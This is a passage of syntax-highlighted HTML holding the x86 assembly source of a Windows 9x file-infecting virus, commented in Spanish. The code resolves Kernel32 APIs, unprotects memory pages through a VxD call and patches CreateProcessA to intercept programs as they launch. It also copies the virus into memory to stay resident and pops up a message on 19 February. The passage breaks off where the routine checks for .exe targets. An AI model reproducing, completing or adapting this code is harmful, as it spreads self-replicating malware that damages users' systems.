       </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">startvirii</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">   </span><span class="sc5">yaresidente</span><span class="sc0">


       </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">                    </span><span class="sc1">;numero de APis a buscar</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">nombreapis</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">direccionesapis</span><span class="sc0">
</span><span class="sc5">otraapi</span><span class="sc4">:</span><span class="sc0">                               </span><span class="sc1">;obtengo la direccion de las apis</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                        </span><span class="sc1">;que voy a utilizar</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetAddressApi</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4h</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">021d</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">otraapi</span><span class="sc0">               </span><span class="sc1">;bueno en este punto tenemos las direcciones</span><span class="sc0">
                                 </span><span class="sc1">;necesarias :)</span><span class="sc0">


      </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00002a00h</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">INT_21</span><span class="sc0">                </span><span class="sc1">;compruebo la fecha del sistema</span><span class="sc0">

      </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">02d</span><span class="sc0">
      </span><span class="sc6">jne</span><span class="sc0">   </span><span class="sc5">nopayload</span><span class="sc0">            </span><span class="sc1">;fecha de activaci¢n 19d de febrero</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">019d</span><span class="sc0">
      </span><span class="sc6">jne</span><span class="sc0">   </span><span class="sc5">nopayload</span><span class="sc0">

      </span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dllmensajito</span><span class="sc0">       </span><span class="sc1">;Obtengo la direccion base de la</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc0">                        </span><span class="sc1">;libreria USER32.dll donde reside </span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">newGetModuleHandleA</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;el api MessageBoxA</span><span class="sc0">

      </span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">apimensajito</span><span class="sc0">      
      </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">newGetProcAddress</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;obtengo la direccion de MessageBoxA</span><span class="sc0">

      </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NLH</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FIRMA</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;llamo al api MessageBoxA</span><span class="sc0">
  

</span><span class="sc5">nopayload</span><span class="sc4">:</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">0bff70h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">desprotegerpagina</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">newCreateProcessA</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0">   </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">0fffff000h</span><span class="sc0">
       </span><span class="sc6">ror</span><span class="sc0">   </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">012d</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">desprotegerpagina</span><span class="sc0">       </span><span class="sc1">;desprotejo 2 paginas una para poder</span><span class="sc0">
                                     </span><span class="sc1">;parchear el api y otra en la que</span><span class="sc0">
                                     </span><span class="sc1">;quedar residente</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">desprotegerpagina</span><span class="sc0">      </span><span class="sc1">;y la siguiente </span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">newCreateProcessA</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">codigoparcheado</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc0">
       </span><span class="sc6">rep</span><span class="sc0">    </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">;copio los 10h primeros bytes del api</span><span class="sc0">
                                      </span><span class="sc1">;CreateProcess</span><span class="sc0">
                                      </span><span class="sc1">;para poder devolver el control al API</span><span class="sc0">
                                      </span><span class="sc1">;cuando sea llamada.</span><span class="sc0">

       </span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PARCHE</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">newCreateProcessA</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;pongo el jmp</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc0">                                </span><span class="sc1">;en la API                                  ;del api</span><span class="sc0">
       </span><span class="sc6">rep</span><span class="sc0">  </span><span class="sc6">movsb</span><span class="sc0">

       </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">startvirii</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">0bff70400h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">viriisize</span><span class="sc0">
       </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">;copio el virus en memoria</span><span class="sc0">

</span><span class="sc5">yaresidente</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">melaspiro</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">popad</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc5">malasunto</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0b8h</span><span class="sc0">        </span><span class="sc1">;esto es un mov eax,inm</span><span class="sc0">
</span><span class="sc5">oldip</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0401000h</span><span class="sc0">    </span><span class="sc1">;Ip de inicio</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">enddata</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;*************** Modifica permisos de pagina *********************</span><span class="sc0">
                                             </span><span class="sc1">;en eax la direccion de callvxd0</span><span class="sc0">
                                             </span><span class="sc1">;y en edi la pagina a modificar</span><span class="sc0">

</span><span class="sc5">desprotegerpagina</span><span class="sc4">:</span><span class="sc0">                             </span><span class="sc1">; LLamada a CALLVXD0</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">llamada</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">modificarpermisos</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">020060000h</span><span class="sc0">    </span><span class="sc1">;nuevos atributos de p gina</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">01h</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">001000dh</span><span class="sc0">      </span><span class="sc1">;llamada a la VXD 1 servicio D (_PageModifyPermissions)</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;**************** Rutina para llamar a la int 21h **********************</span><span class="sc0">

</span><span class="sc5">INT_21</span><span class="sc4">:</span><span class="sc0">                             </span><span class="sc1">; LLamada a la INT 21</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">002a0010h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">llamada</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc1">;************** Procedimiento que encuentra la direccion de las apis ***************</span><span class="sc0">
</span><span class="sc1">;**************           en la export table del Kernel32            ***************</span><span class="sc0">

</span><span class="sc5">GetAddressApi</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">longitudapi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">apiabuscar</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">  </span><span class="sc1">;pusheo el valor de la string</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">contador</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">;pongo a cero el valor del contador</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">K32</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3CH</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">                      </span><span class="sc1">;en ax me quedar  el comienzo del PE header</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">K32</span><span class="sc0">            </span><span class="sc1">;a la que le suma la direcci¢n base del Kernel32</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">EAX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">78H</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; 78H = la direcci¢n a la export table</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">K32</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1cH</span><span class="sc0">           </span><span class="sc1">; 1CH RVA para la adress table</span><span class="sc0">

    
        </span><span class="sc6">lodsd</span><span class="sc0">                           </span><span class="sc1">;obtengo los offset de algunas TABLAS</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">K32</span><span class="sc0">                 </span><span class="sc1">;interesantes de la export table</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">addresstable</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">K32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">nametable</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">K32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ordinaltable</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;ADDRESS TABLE RVA = DD Relative Virtual Address of the Export Address</span><span class="sc0">
</span><span class="sc1">;Table.</span><span class="sc0">
</span><span class="sc1">;NAME TABLE RVA = DD Relative Virtual Address of the Export Name Table</span><span class="sc0">
</span><span class="sc1">;Pointers.</span><span class="sc0">
</span><span class="sc1">;ORDINAL TABLE RVA = DD Relative Virtual Address of Export Ordinals</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">nametable</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">anotherapi</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">K32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">apiabuscar</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">longitudapi</span><span class="sc4">]</span><span class="sc1">;en ecx el numero de bytes</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">                                    </span><span class="sc1">;con los que compararemos</span><span class="sc0">
        </span><span class="sc6">repe</span><span class="sc0">   </span><span class="sc6">cmpsb</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">encontrada</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">contador</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">anotherapi</span><span class="sc0">

</span><span class="sc5">encontrada</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">esi</span><span class="sc0">

       </span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">contador</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ordinaltable</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Con el valor de contador</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                          </span><span class="sc1">;me voy a la ordinal table</span><span class="sc0">
       </span><span class="sc6">lodsw</span><span class="sc0">                                  </span><span class="sc1">;y busco el ordinal del API</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0000ffffh</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">addresstable</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;Y con el ordinal me voy a la</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                           </span><span class="sc1">;adress table</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">K32</span><span class="sc0">         </span><span class="sc1">;devuelvo en eax la direccion del API</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;***************************************************************************</span><span class="sc0">
</span><span class="sc1">;*                                                                         *           </span><span class="sc0">
</span><span class="sc1">;*       Comienzo de la Rutina que intercepa la API CreateProcessA         *</span><span class="sc0">
</span><span class="sc1">;*                                                                         *</span><span class="sc0">
</span><span class="sc1">;***************************************************************************</span><span class="sc0">


</span><span class="sc5">starthook</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">ebp</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">getdelta</span><span class="sc0">               </span><span class="sc1">;obtengo el delta </span><span class="sc0">
</span><span class="sc5">getdelta</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">ebp</span><span class="sc0">                     
           </span><span class="sc6">sub</span><span class="sc0">   </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">getdelta</span><span class="sc0">

           
           </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;obtengo el puntero a la cadena de texto</span><span class="sc0">
                              </span><span class="sc1">;de la pila :)</span><span class="sc0">
           </span><span class="sc6">pushad</span><span class="sc0">                </span><span class="sc1">;pusheo tooo</span><span class="sc0">

           </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">              
           </span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hoste</span><span class="sc0">
</span><span class="sc5">otrocar</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">;copio la cadena de texto con el nombre</span><span class="sc0">
           </span><span class="sc6">je</span><span class="sc0">   </span><span class="sc5">sacabo</span><span class="sc0">                </span><span class="sc1">;de la victima en la variable hoste</span><span class="sc0">
           </span><span class="sc6">movsb</span><span class="sc0">
           </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">otrocar</span><span class="sc0">
</span><span class="sc5">sacabo</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">movsb</span><span class="sc0">        </span><span class="sc1">;copio el 0 tambin</span><span class="sc0">

           </span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hoste</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">022h</span><span class="sc0">
           </span><span class="sc6">jne</span><span class="sc0">   </span><span class="sc5">proseguir</span><span class="sc0">                </span><span class="sc1">;rehago el string por si est </span><span class="sc0">
                                          </span><span class="sc1">;entre comillas</span><span class="sc0">
           </span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hoste</span><span class="sc0">
           </span><span class="sc6">inc</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">mascara</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">022h</span><span class="sc0">
           </span><span class="sc6">je</span><span class="sc0">   </span><span class="sc5">finalizar</span><span class="sc0">
           </span><span class="sc6">movsb</span><span class="sc0">
           </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">mascara</span><span class="sc0">
</span><span class="sc5">finalizar</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">
           </span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc5">proseguir</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">3h</span><span class="sc4">],</span><span class="sc12">'EX'</span><span class="sc0">
           </span><span class="sc6">je</span><span class="sc0">   </span><span class="sc5">esunexe</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">3h</span><span class="sc4">],</span><span class="sc12">'ex'</span><span class="sc0">
           </span><span class="sc6">je</span><span class="sc0">   </span><span class="sc5">esunexe</span><span class="sc0">
           </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc5">emergencia</span><span class="sc0">
</span><span class="sc5">esunexe</span><span class="sc4">:</span><span class="sc0">
